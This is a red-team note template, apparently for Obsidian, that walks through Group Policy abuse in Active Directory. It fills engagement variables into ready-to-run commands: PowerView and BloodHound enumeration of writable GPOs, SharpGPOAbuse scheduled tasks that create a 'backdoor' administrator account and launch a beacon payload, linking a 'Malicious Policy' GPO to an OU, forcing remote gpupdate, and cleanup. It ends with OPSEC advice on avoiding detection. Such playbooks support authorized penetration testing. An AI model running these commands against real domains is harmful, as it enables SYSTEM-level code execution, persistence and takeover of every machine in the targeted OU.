---
# Attack-specific fields
gpo_target_ou:
gpo_name:
gpo_guid:
gpo_writable_principal:
gpo_action: scheduled_task
notes:
---

# Group Policy Abuse

> [!abstract] Attack Summary
> If you have **write permissions** on a GPO or the ability to create and link a GPO, you can deploy malicious configurations (scheduled tasks, registry run keys, startup scripts) to all machines/users in the linked OU. This allows command execution as SYSTEM on targeted computers or code execution for targeted users.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const actions = ["scheduled_task","registry_run","startup_script","computer_startup"];
const actionOptions = actions.map(a => `option(${a})`).join(',');

dv.table(["Field", "Value"], [
  ["Writable GPO Name",    `\`INPUT[text:gpo_name]\``],
  ["GPO GUID",             `\`INPUT[text:gpo_guid]\``],
  ["Target OU (DN)",       `\`INPUT[text:gpo_target_ou]\``],
  ["Principal with Write", `\`INPUT[text:gpo_writable_principal]\``],
  ["Abuse Method",         `\`INPUT[inlineSelect(defaultValue(${p.gpo_action ?? 'scheduled_task'}),${actionOptions}):gpo_action]\``],
]);
```

---

## Step 1 — Enumerate GPOs and Permissions

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const username = b?.username ?? "USER";
dv.paragraph("```powershell\n# List all GPOs\nGet-DomainGPO -Properties DisplayName,CN\n\n# Find GPOs where current user has modify rights\nGet-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | " +
  "?{ $_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericWrite|GenericAll|WriteDacl|WriteOwner' -and " +
  "$_.SecurityIdentifier -match '^S-1-5-21' }\n\n# Find GPOs linked to specific OUs\nGet-DomainOU | Select distinguishedname,gplink\n\n# Get GPO details\nGet-DomainGPO -Name 'GPO_NAME' | Select *\n```");
```

**Windows — SharpGPOAbuse / PowerView**
```dataviewjs
dv.paragraph("```powershell\n# Find GPOs you can modify\nGet-DomainGPO | ForEach-Object { \n  $dn = $_.distinguishedname\n  $gpoAcl = Get-DomainObjectAcl $dn -ResolveGUIDs | ?{ $_.SecurityIdentifier -eq (whoami /user | Select-String 'S-1-5-21').ToString().Trim() }\n  if ($gpoAcl) { $_ | Select displayname,name }\n}\n```");
```

**Linux — BloodHound / Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Collect GPO data via BloodHound\nbloodhound-python -u '" + username + "' -p '" + password + "' -d " + domain + " -dc " + dc_ip + " -c GPO\n\n# Or via impacket ldap3\nimpacket-lookupsid " + domain + "/" + username + ":'" + password + "'@" + dc_ip + "\n```");
```

GPO name: `INPUT[text:gpo_name]` | GUID: `INPUT[text:gpo_guid]`

---

## Step 2a — Modify Existing GPO (Scheduled Task)

**Windows — SharpGPOAbuse**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain  = b?.domain ?? "DOMAIN";
const gpoName = p?.gpo_name || "GPO_NAME";
dv.paragraph("```bash\n# Add a scheduled task to a writable GPO\nexecute-assembly C:\\Tools\\SharpGPOAbuse\\SharpGPOAbuse.exe --AddComputerTask " +
  "--TaskName 'Update' --Author '" + domain.split('.')[0].toUpperCase() + "\\administrator' " +
  "--Command 'C:\\Windows\\System32\\cmd.exe' --Arguments '/c net user backdoor Passw0rd! /add && net localgroup administrators backdoor /add' " +
  "--GPOName '" + gpoName + "'\n\n# Or add user task (runs as logged-in user)\nexecute-assembly C:\\Tools\\SharpGPOAbuse\\SharpGPOAbuse.exe --AddUserTask " +
  "--TaskName 'Update' --Author '" + domain.split('.')[0].toUpperCase() + "\\administrator' " +
  "--Command 'C:\\Windows\\System32\\cmd.exe' --Arguments '/c beacon_payload.exe' " +
  "--GPOName '" + gpoName + "' --FilterEnabled --Filter 'Domain Users'\n```");
```

**Windows — PowerView (modify GPO registry)**
```dataviewjs
const p = dv.current();
const gpoName = p?.gpo_name || "GPO_NAME";
dv.paragraph("```powershell\n# Add registry run key via GPO\nSet-DomainObject -Identity '" + gpoName + "' -Set @{'gpcmachineextensionnames'='[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]'}\n```");
```

---

## Step 2b — Create and Link New GPO

**Windows — PowerShell RSAT**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "domain.local";
const targetOU = p?.gpo_target_ou || "OU=Workstations,DC=domain,DC=local";
dv.paragraph("```powershell\nImport-Module GroupPolicy\n\n# Create new GPO\nNew-GPO -Name 'Malicious Policy' -Domain " + domain + "\n\n# Link to target OU\nNew-GPLink -Name 'Malicious Policy' -Target '" + targetOU + "' -LinkEnabled Yes\n\n# Enforce it\nSet-GPInheritance -Target '" + targetOU + "' -IsBlocked No\n```");
```

Target OU: `INPUT[text:gpo_target_ou]`

---

## Step 3 — Force GPO Update on Targets

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const targetFqdn = p?.cred_target_fqdn || b?.target_fqdn || "TARGET.domain.local";
dv.paragraph("```bash\n# Force immediate update on remote host\nremote-exec wmi " + targetFqdn + " gpupdate /force\n\n# Or wait for default 90-minute refresh cycle\n\n# Verify GPO applied\nrun gpresult /r\n```");
```

---

## Step 4 — Cleanup

```dataviewjs
const p = dv.current();
const gpoName = p?.gpo_name || "GPO_NAME";
dv.paragraph("```powershell\n# Remove scheduled task from GPO\n# (Re-run SharpGPOAbuse with --Remove flag or manually edit GPO)\n\n# Delete the GPO if you created it\nRemove-GPO -Name 'Malicious Policy'\n\n# Unlink GPO from OU\nRemove-GPLink -Name 'Malicious Policy' -Target 'OU=...' \n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - GPO modification generates **Event 5136** (directory service object modified) on the DC.
> - New GPO creation is logged in **Event 5137**.
> - Forced GPO refresh (`gpupdate`) generates network traffic to the DC.
> - Scheduled tasks added via GPO appear in XML files in SYSVOL — visible to defenders.
> - Prefer stealthy methods: modify existing GPOs rather than creating new ones.

---

## Notes & Results

`INPUT[textarea:notes]`
